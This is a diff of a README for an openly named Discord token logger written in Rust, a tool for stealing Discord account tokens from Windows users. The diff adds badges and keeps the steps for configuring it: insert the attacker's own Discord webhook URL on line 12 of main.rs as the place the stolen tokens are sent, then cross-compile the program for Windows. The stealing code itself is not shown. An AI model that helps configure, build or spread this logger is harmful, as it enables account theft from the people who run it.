@@ -1,14 +1,19 @@
-# TokenLogger-rs
+# Discord Token Logger
 
-#### A Discord Token Logger Written in Rust
+![Rust](https://img.shields.io/badge/Rust-1.54.0-orange?style=for-the-badge)
+![Build](https://img.shields.io/badge/Build-Passing-brightgreen?style=for-the-badge)
+![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge)
 
-On line 12 in [main.rs](https://gitlab.com/XDDudeGuy/tlog/-/blob/main/src/main.rs) (shown below) you must replace the variable with your webhook url
+A Discord Token Logger Written in Rust.
+
+### Configuration
+
+On line 12 in [main.rs](https://github.com/MasterOfBrokenLogic/src/main.rs), replace the variable with your webhook URL from Discord:
 
 ```rust
 let url = "Discord Webhook URL";
-```
 
-To build just do
+To build this project just run:
 
 ```shell
 $ cargo build --target x86_64-pc-windows-gnu
